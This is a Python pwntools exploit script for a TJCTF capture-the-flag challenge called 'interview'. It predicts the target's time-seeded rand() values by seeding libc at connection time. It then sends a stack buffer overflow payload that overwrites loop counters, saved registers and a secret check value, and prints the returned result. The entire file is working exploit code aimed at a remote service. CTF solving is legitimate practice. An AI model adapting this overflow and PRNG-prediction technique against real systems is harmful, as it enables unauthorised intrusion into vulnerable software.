#!/usr/bin/env python

from pwn import *
import time
import random
from ctypes import CDLL
from math import floor
import sys


context.log_level = 'critical'

#### This is a hack to match up with the srand(time(NULL)) in C...
libc = CDLL('libc-2.23.so')
s = remote('problem1.tjctf.org', 8000); s.recv(); s.recv()
# s = process('./interview')

#### After we have connected, seed the PRNG at the same time...
now = int(floor(time.time()))
libc.srand(now)

variables = []
payload = 'A'*64
for i in range(10):    
    payload += p32(libc.rand())

# padding = int(sys.argv[1])
payload += p32(0x01010101) #  j
payload += p32(0x01010101) #  i
payload += p32(0xdeadbeef)  #  push ebx
payload += p32(0xdeadbeef)  #  return address
payload += p32(0xdeadbeef)  #  EIP
payload += p32(0xdeadbeef)  #  EBP
payload += p32(0xdeadbeef + 0x01010101 - 10)  # secret (because j still 10)

s.sendline(payload)


s.recv()
print s.recv().split('\n')[-2].split()[-1]
# 0x08048662
# exit()

open('payload','w').write(payload)
